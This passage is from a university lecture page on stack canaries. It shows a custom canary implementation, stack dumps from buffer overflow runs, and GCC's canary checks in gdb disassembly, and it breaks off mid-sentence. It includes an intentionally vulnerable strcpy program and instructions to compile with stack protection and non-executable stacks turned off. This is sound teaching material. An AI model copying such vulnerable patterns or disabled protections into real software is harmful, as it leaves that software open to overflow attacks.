@@ -1,0 +1,1327 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-06 Fri 14:08 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 18: Stack Canaries</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 18: Stack Canaries</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline5">1. Stack Smashing Detected</a>
+<ul>
+<li><a href="#orgheadline1">1.1. Stack Guards and Canaries</a></li>
+<li><a href="#orgheadline2">1.2. Implementing Stack Guards and Canaries</a></li>
+<li><a href="#orgheadline3">1.3. The anatomy of a canary</a></li>
+<li><a href="#orgheadline4">1.4. Watching Canaries in Action</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline8">2. GCC's implementation of Stack Canaries</a>
+<ul>
+<li><a href="#orgheadline6">2.1. Disassembling Canary Code</a></li>
+<li><a href="#orgheadline7">2.2. Canaries Are Consistent across Function Calls and Forks</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline12">3. Defeating Stack Canaries</a>
+<ul>
+<li><a href="#orgheadline9">3.1. Some Really Bad Code</a></li>
+<li><a href="#orgheadline10">3.2. Defeating a Canary in GDB</a></li>
+<li><a href="#orgheadline11">3.3. Brute Forcing the Canary</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-2">
+<h2 id="orgheadline5"><span class="section-number-2">1</span> Stack Smashing Detected</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+At some point in your programming life, you may have noticed the
+following error message, either because (like in this class) you are
+trying to smash the stack, or because you made some sort of a
+programming error (more likely).
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./smasher `python -c "print 'A'*100"`
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** stack smashing detected ***: ./smasher terminated
+Aborted (core dumped)
+</pre>
+
+
+<p>
+What is this that error? How is it generated? How is it tested for?
+How do we defeat such a check? That's what we'll be working on next.
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-3">
+<h3 id="orgheadline1"><span class="section-number-3">1.1</span> Stack Guards and Canaries</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+A <i>stack guard</i> or a <i>canary</i> is a bit of data that sits between your
+buffer and the return address and acts as a warning when buffers are
+overflowed and the return address might be overwritten. The term
+"canary" comes from the ol' cold mines, where the canary is more
+sensitive to deadly and orderless natural gases that can sneak up on
+miners. If the canary is found dead, then everyone knows it is time to
+evacuate the cave. Similarly, in the program, if the canary is
+overwritten, the program knows it is time to abort the operation and
+report an error rather than actually returning from the function and
+potentially setting up a vulnerability.
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">1.2</span> Implementing Stack Guards and Canaries</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+While the canaries are added in through a compilation process with
+gcc&#x2014;and we will take a look at that in more detail in a bit&#x2014;we can
+also implement our own version of canary checks to see how this
+process all works. Here's some sample code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="orgsrcblock1"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">_canary</span>;
+
+<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">initialize the cannary at program start up</span>
+<span style="color: #00ffff;">__attribute__</span> ((constructor)) <span style="color: #98fb98;">int</span> <span style="color: #87cefa;">initcannary</span>(){
+  srand(time(<span style="color: #7fffd4;">NULL</span>));
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">canary</span> = random(); <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">choose random 4 byte value</span>
+  canary &amp;= 0xffffff00; <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">zero at last byte</span>
+  canary |= 0x01010100; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">nothing but last byte can be zero</span>
+  _canary = canary;
+}
+
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">check_canary</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">buf</span>, <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">len</span>){
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check canary to see if it survived</span>
+  <span style="color: #00ffff;">if</span>( *((<span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> *) &amp;buf[len]) != _canary){
+    fprintf(stderr, <span style="color: #ffa07a;">"**STACK SMASHING DETECTED**\n"</span>);
+    abort();
+  }
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">set_canary</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">buf</span>, <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">len</span>){
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">add canary to end of buffer</span>
+  *((<span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> *) &amp;buf[len]) =  _canary;
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[10]; 
+  set_canary(buf,10);
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"You said: %s\n"</span>,buf);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check the canary before return</span>
+  check_canary(buf,10);
+  <span style="color: #00ffff;">return</span>;
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  foo(argv[1]);
+
+}
+</pre>
+</div>
+
+<p>
+First focus on the <code>foo</code> function, where after declaring the static
+array, the canary is set, and after before the return, the canary is
+checked. The remaining functions, initialize the canary, set the
+canary, and check the canary.
+</p>
+
+<p>
+What is the "canary" in this context? it's just an integer whose least
+significant byte is 0. This is set in the function <code>initcanary</code> sets
+this up, and that function is also a C constructor function, which is
+a special attribute to the function that forces it to run before
+<code>main()</code>. The canary value is assigned to a global variable to be
+referred to later.
+</p>
+
+<p>
+The <code>check_canary</code> and <code>set_canary</code> functions leverage the fact that
+following the buffer allocation on the stack, there tends to be a bit
+of extra space. That's where we'll place our canary, immediately
+following that spot, and now we can set and check as needed.
+</p>
+
+<p>
+Let's see how it works:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*8"`
+You said: AAAAAAAA
+user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*9"`
+You said: AAAAAAAAA
+user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*10"`
+You said: AAAAAAAAAA
+user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*11"`
+You said: AAAAAAAAAAA
+**STACK SMASHING DETECTED**
+Aborted (core dumped)
+</pre>
+<p>
+&#x2026; like a charm.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">1.3</span> The anatomy of a canary</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+Let's take a closer look at the <code>initcanary</code> function to understand
+the anatomy of what makes a good canary:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">initialize the cannary at program start up</span>
+<span style="color: #00ffff;">__attribute__</span> ((constructor)) <span style="color: #98fb98;">int</span> <span style="color: #87cefa;">initcannary</span>(){
+  srand(time(<span style="color: #7fffd4;">NULL</span>));
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">canary</span> = random(); <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">choose random 4 byte value</span>
+  canary &amp;= 0xffffff00; <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">zero at last byte</span>
+  canary |= 0x01010100; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">nothing but last byte can be zero</span>
+  _canary = canary;
+}
+</pre>
+</div>
+
+<p>
+The rules are:
+</p>
+<ol class="org-ol">
+<li>The canary should be a random value</li>
+<li>The canary should have the least significant byte be zero</li>
+<li>The canary should have no NULLs elsewhere</li>
+</ol>
+
+<p>
+For rule 1, the reason is somewhat obvious. If we new canary value
+<i>was not</i> random, then we would know what it is and just include it in
+our exploit string.
+</p>
+
+<p>
+Rule 2 and 3 are a bit less clear. The reason for these is that we
+want to zealously check the canary value, but we want to allow for
+small overruns of a buffer, as what might happen when we copy the NULL
+byte in strcpy(), but anything more than that we want to detect. Also,
+we don't want excess NULL bytes in the canary in case of benign
+overruns and also could effect the string null termination. 
+</p>
+
+<p>
+There is also another VERY important reason for the canary to have a
+NULL byte! Consider what happens when your exploit has a NULL byte and
+your leveraging <code>strcpy()</code>? Well <code>strcpy()</code> will stop at the null byte
+and thus you can't easily overwrite the canary, even if you knew it or
+were trying to guess it.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">1.4</span> Watching Canaries in Action</h3>
+<div class="outline-text-3" id="text-1-4">
+<p>
+Finally, to put all the pieces together, we need to be able to see the
+cannery in action to understand its function. To do that, I've written
+a nifty little function that will print the stack of a calling
+process, so called print<sub>stack</sub>(), whose source is below:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="orgsrcblock2"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #ffa07a;">/**</span>
+<span style="color: #ffa07a;"> *fname : function name</span>
+<span style="color: #ffa07a;"> *argc  : number of WORD size arguments</span>
+<span style="color: #ffa07a;"> **/</span>
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">print_stack</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">fname</span>, <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>){
+  <span style="color: #ff7f24;">/* </span><span style="color: #ff7f24;">Function for printing calling functions stack frame </span><span style="color: #ff7f24;">*/</span>
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> * <span style="color: #eedd82;">base_p</span>;
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> * <span style="color: #eedd82;">saved_p</span>;
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> * <span style="color: #eedd82;">stack_p</span>;
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> * <span style="color: #eedd82;">cur</span>;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">embedded ASM to retrieve base pointer and saved base pointer</span>
+  <span style="color: #00ffff;">__asm__</span> __volatile__ (<span style="color: #ffa07a;">"mov %%ebp, %[base_p]"</span> : 
+                        [base_p] <span style="color: #ffa07a;">"=r"</span> (base_p));
+  <span style="color: #00ffff;">__asm__</span> __volatile__ (<span style="color: #ffa07a;">"mov 0(%%ebp), %[saved_p]"</span> : 
+                        [saved_p] <span style="color: #ffa07a;">"=r"</span> (saved_p));
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set stack frame info to calling stack frame</span>
+  stack_p = base_p;
+  base_p = saved_p;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">output information</span>
+  printf(<span style="color: #ffa07a;">"--- STACK %s ---\n"</span>,fname);
+  <span style="color: #00ffff;">for</span>(cur = base_p+argc+1; cur &gt;= stack_p; cur--){
+    <span style="color: #00ffff;">if</span> (cur == base_p){
+      printf(<span style="color: #ffa07a;">"%p &lt;ebp&gt;: %08x\n"</span>, cur, *cur);
+    }<span style="color: #00ffff;">else</span> <span style="color: #00ffff;">if</span> (cur &lt;= base_p){
+      printf(<span style="color: #ffa07a;">"%p &lt;ebp-0x%x&gt;: %08x\n"</span>, cur, 
+             (<span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span>) (base_p-cur) * 4, *cur);
+    }<span style="color: #00ffff;">else</span>{
+      printf(<span style="color: #ffa07a;">"%p &lt;ebp+0x%x&gt;: %08x\n"</span>, cur, 
+             (<span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span>) (cur-base_p) * 4, *cur);
+    }
+  } 
+
+}
+</pre>
+</div>
+
+<p>
+Don't worry too much about how it works, but it embeds a bit of
+assembly into the program to reconstruct the calling stack frame and
+print out a well formatted version of the stack so we can take a look
+around. Here's the <code>foo</code> function updated with the <code>print_stack</code>
+function:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[10]; 
+  set_canary(buf,10);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">inspect stack before</span>
+  print_stack(<span style="color: #ffa07a;">"foo"</span>,1);
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"You said: %s\n"</span>,buf);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">inspect stack after</span>
+  print_stack(<span style="color: #ffa07a;">"foo"</span>,1);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check the canary before return</span>
+  check_canary(buf,10);
+  <span style="color: #00ffff;">return</span>;
+}
+</pre>
+</div>
+
+<p>
+And now when we run it, we can see what happens. Let's start by
+inspecting for a run where nothing should go wrong:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*9"`
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff878
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 0d173300 //&lt;--- Canary
+0xbffff66c &lt;ebp-0xc&gt;: 080487c2
+0xbffff668 &lt;ebp-0x10&gt;: 00000002
+0xbffff664 &lt;ebp-0x14&gt;: 0000002f
+0xbffff660 &lt;ebp-0x18&gt;: bffff85f
+0xbffff65c &lt;ebp-0x1c&gt;: 0d173300
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 080486fd
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+You said: AAAAAAAAA
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff878
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 0d173300 //&lt;--- Canary
+0xbffff66c &lt;ebp-0xc&gt;: 00414141
+0xbffff668 &lt;ebp-0x10&gt;: 41414141
+0xbffff664 &lt;ebp-0x14&gt;: 4141002f //&lt;--- Buffer of A's
+0xbffff660 &lt;ebp-0x18&gt;: bffff85f
+0xbffff65c &lt;ebp-0x1c&gt;: 0d173300
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 08048736
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+</pre>
+
+<p>
+You see that the buffer comes short of killing the canary. Now, let's
+do 10 A's:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*10"`
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff877
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 21818b00
+0xbffff66c &lt;ebp-0xc&gt;: 080487c2
+0xbffff668 &lt;ebp-0x10&gt;: 00000002
+0xbffff664 &lt;ebp-0x14&gt;: 0000002f
+0xbffff660 &lt;ebp-0x18&gt;: bffff85e
+0xbffff65c &lt;ebp-0x1c&gt;: 21818b00
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 080486fd
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+You said: AAAAAAAAAA
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff877
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 21818b00  //&lt;-- strcpy overrights 0x00 in canary
+0xbffff66c &lt;ebp-0xc&gt;: 41414141
+0xbffff668 &lt;ebp-0x10&gt;: 41414141
+0xbffff664 &lt;ebp-0x14&gt;: 4141002f //&lt;-- Buffer of A's
+0xbffff660 &lt;ebp-0x18&gt;: bffff85e
+0xbffff65c &lt;ebp-0x1c&gt;: 21818b00
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 08048736
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+</pre>
+
+<p>
+This time the buffer of A's is all filled up, but we used <code>strcpy()</code>
+which will copy the NULL byte to the end. That means that 11 bytes are
+written, the last one being 0x00. Fortunately, because our canary has
+a 0x00 in our last byte, we don't abort. However, at 11 we do:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*11"`
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff876
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 0f69b900
+0xbffff66c &lt;ebp-0xc&gt;: 080487c2
+0xbffff668 &lt;ebp-0x10&gt;: 00000002
+0xbffff664 &lt;ebp-0x14&gt;: 0000002f
+0xbffff660 &lt;ebp-0x18&gt;: bffff85d
+0xbffff65c &lt;ebp-0x1c&gt;: 0f69b900
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 080486fd
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+You said: AAAAAAAAAAA
+--- STACK foo ---
+0xbffff680 &lt;ebp+0x8&gt;: bffff876
+0xbffff67c &lt;ebp+0x4&gt;: 08048765
+0xbffff678 &lt;ebp&gt;: bffff698
+0xbffff674 &lt;ebp-0x4&gt;: bffff734
+0xbffff670 &lt;ebp-0x8&gt;: 0f690041 //&lt;--- Canary Dead :(
+0xbffff66c &lt;ebp-0xc&gt;: 41414141
+0xbffff668 &lt;ebp-0x10&gt;: 41414141
+0xbffff664 &lt;ebp-0x14&gt;: 4141002f
+0xbffff660 &lt;ebp-0x18&gt;: bffff85d
+0xbffff65c &lt;ebp-0x1c&gt;: 0f69b900
+0xbffff658 &lt;ebp-0x20&gt;: 00000001
+0xbffff654 &lt;ebp-0x24&gt;: 00000001
+0xbffff650 &lt;ebp-0x28&gt;: 08048869
+0xbffff64c &lt;ebp-0x2c&gt;: 08048736
+0xbffff648 &lt;ebp-0x30&gt;: bffff678
+**STACK SMASHING DETECTED**
+Aborted (core dumped)
+</pre>
+
+<p>
+Now the canary is dead, and the world has been saved from one more exploit.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-2">
+<h2 id="orgheadline8"><span class="section-number-2">2</span> GCC's implementation of Stack Canaries</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+So far, we've been compiling our programs such that stack protectors
+have been turned off:
+</p>
+
+<pre class="example">
+gcc -fno-stack-protector -z execstack
+</pre>
+
+<p>
+Now, let's compile a few programs with included stack protectors so we
+can get a better sense of how gcc implements these. (Note, we'll turn
+off the <code>execstack</code> option at some point soon).
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ cat smasher.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void foo(char * s){
+  char buf[10];
+  strcpy(buf,s);
+
+  printf("You said: %s\n",buf);
+}
+
+
+int main(int argc, char *argv[]){
+
+  foo(argv[1]);
+
+}
+user@si485H-base:demo$ gcc -z execstack smasher.c -o smasher
+user@si485H-base:demo$ ./smasher `python -c "print 'A'*9"`
+You said: AAAAAAAAA
+user@si485H-base:demo$ ./smasher `python -c "print 'A'*10"`
+You said: AAAAAAAAAA
+user@si485H-base:demo$ ./smasher `python -c "print 'A'*11"`
+You said: AAAAAAAAAAA
+ *** stack smashing detected ***: ./smasher terminated
+Aborted (core dumped)
+</pre>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">2.1</span> Disassembling Canary Code</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+We can start by placing a break point at foo, and looking at the
+disassembly in gdb.:
+</p>
+
+<pre class="example">
+(gdb) br foo
+Breakpoint 1 at 0x80484a9: file smasher.c, line 5.
+(gdb) r `python -c "print 'A'*11"`
+Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/smasher `python -c "print 'A'*11"`
+
+Breakpoint 1, foo (s=0xbffff87d 'A' &lt;repeats 11 times&gt;) at smasher.c:5
+5	void foo(char * s){
+(gdb) ds foo
+Dump of assembler code for function foo:
+   0x0804849d &lt;+0&gt;:	push   ebp
+   0x0804849e &lt;+1&gt;:	mov    ebp,esp
+   0x080484a0 &lt;+3&gt;:	sub    esp,0x28
+   0x080484a3 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080484a6 &lt;+9&gt;:	mov    DWORD PTR [ebp-0x1c],eax
+=&gt; 0x080484a9 &lt;+12&gt;:	mov    eax,gs:0x14
+   0x080484af &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484b2 &lt;+21&gt;:	xor    eax,eax
+   0x080484b4 &lt;+23&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x080484b7 &lt;+26&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484bb &lt;+30&gt;:	lea    eax,[ebp-0x16]
+   0x080484be &lt;+33&gt;:	mov    DWORD PTR [esp],eax
+   0x080484c1 &lt;+36&gt;:	call   0x8048370 &lt;strcpy@plt&gt;
+   0x080484c6 &lt;+41&gt;:	lea    eax,[ebp-0x16]
+   0x080484c9 &lt;+44&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484cd &lt;+48&gt;:	mov    DWORD PTR [esp],0x80485a0
+   0x080484d4 &lt;+55&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x080484d9 &lt;+60&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484dc &lt;+63&gt;:	xor    eax,DWORD PTR gs:0x14
+   0x080484e3 &lt;+70&gt;:	je     0x80484ea &lt;foo+77&gt;
+   0x080484e5 &lt;+72&gt;:	call   0x8048360 &lt;__stack_chk_fail@plt&gt;
+   0x080484ea &lt;+77&gt;:	leave  
+   0x080484eb &lt;+78&gt;:	ret    
+End of assembler dump.
+</pre>
+
+<p>
+One thing you might notice is that there is a bit more initialization
+at the top of the function. In particular, the code for argument is
+moved from <code>ebp+0x8</code> down the stack to <code>ebp-0x1c</code>. This is to also
+protect it from overruns. More importantly, is the next two three
+lines, which: (1) grab a value from address <code>gs:0x14</code> and then (2)
+move that value onto the stack at <code>ebp-0xc</code>. That is the cannary.
+</p>
+
+<p>
+The <code>gs:0x14</code> refers to an address in the threads local storage, and
+the <code>gs</code> register is used to calculate an offset into that storage
+location. The <code>gs:0x14</code> is a <i>logical address</i> used based on
+calculating an offset of 0x14 from the start of the
